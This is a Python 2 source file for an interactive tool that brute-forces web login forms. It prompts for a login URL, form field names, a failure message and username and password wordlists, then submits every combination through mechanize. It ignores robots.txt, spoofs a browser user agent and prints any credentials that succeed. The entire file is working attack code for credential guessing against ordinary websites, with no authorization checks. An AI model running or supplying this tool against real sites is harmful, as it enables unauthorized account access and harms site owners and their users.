import sys

end = '\033[0m'
yellow = '\033[33m'
red="\033[0;31m"
green="\033[0;32m"
brown="\033[0;33m"
blue="\033[0;34m"
pur="\033[0;35m"

def __start__():
	try:
		import mechanize
	except ImportError:
		print
		print red+"[-] Not found 'mechanize' library"+end
		print
		sys.exit()
	print
	print green+"[+] Pleaes enter url login webserver"
	print "    e.x: [http, https]://example.com/admin/login.[php, html, aspx, asp]"+end
	print
	try:
		url = raw_input(brown+"config_brute > url >>> "+end)
	except KeyboardInterrupt:
		print
		sys.exit()
	print
	print green+"[+] Please enter method name page login"
	print "    e.x: [POST, GET, ...]"+end
	print
	try:
		methodd = raw_input(brown+"config_brute > method >>> "+end)
	except KeyboardInterrupt:
		print
		sys.exit()
	print
	print green+"[+] Please enter name html form username"
	print "    e.x: username"+end
	print
	try:
		username = raw_input(brown+"config_brute > username >>> "+end)
	except KeyboardInterrupt:
		print
		sys.exit()
	print
	print green+"[+] Please enter name html form password"
	print "    e.x: password"+end
	print
	try:
		password = raw_input(brown+"config_brute > password >>> "+end)
	except KeyboardInterrupt:
		print
		sys.exit()
	print
	print green+"[+] Please enter error is mistake next login"
	print "    e.x: Error, username or password is incorect"+end
	print
	try:
		error = raw_input(brown+"config_brute > error >>> "+end)
	except KeyboardInterrupt:
		print
		sys.exit()
	print
	print green+"[+] Please enter username file"
	print "    e.x: user.txt"+end
	print
	try:
		userFILE = raw_input(brown+"config_brute > userFile >>> "+end)
	except KeyboardInterrupt:
		print
		sys.exit()
	print
	print green+"[+] Please enter password file"
	print "    e.x: pass.txt"+end
	print
	passFILE = raw_input(brown+"config_brute > passwordFile >>> "+end)
	print
	print brown+" url: "+green+url+end
	print brown+" method: "+green+methodd+end
	print brown+" username name: "+green+username+end
	print brown+" password name: "+green+password+end
	print brown+" error: "+green+error+end
	print brown+" user file: "+green+userFILE+end
	print brown+" passwd file: "+green+passFILE+end
	print
	confirm = raw_input(brown+"config_brute > confirm[Y, n] >>> "+end)
	if confirm == "" or confirm == "Y" or confirm == "y":
		try:
			userOPEN = open(userFILE, "r")
			userWORD = userOPEN.readlines()
			userOPEN.close()
		except IOError:
			print
			print red+"[-] Not found username file: "+userFILE+end
			print
			sys.exit()
		try:
			passOPEN = open(passFILE, "r")
			passWORD = passOPEN.readlines()
			passOPEN.close()
		except IOError:
			print
			print red+"[-] Not found password file: "+passFILE+end
			print
			sys.exit()
		try:
			br = mechanize.Browser()
			br.set_handle_robots(False)
			br.addheaders = [("User-agent", 'Firefox')]
			br.open(url)
		except:
			print
			print red+"[-] Not found url webserver: "+url+end
			print
		for usernamee in userWORD:
			usernamee = usernamee.strip()
			for passwordd in passWORD:
				passwordd = passwordd.strip()
				
				br = mechanize.Browser()
				br.set_handle_robots(False)
				br.addheaders = [("User-agent", 'Firefox')]
				br.open(url)
				br.select_form(method=methodd)
				br[username] = usernamee
				br[password] = passwordd
				res = br.submit()
					
				if error in res.read():
					pass
				else:
					print
					print green+"[+] Founded!: "+end
					print
					print brown+" url: "+green+url+end
					print brown+" username: "+green+usernamee+end
					print brown+" password: "+green+passwordd+end
					print
					raw_input(brown+'[*] Press enter for continue ...'+end)
	else:
		print
		sys.exit()






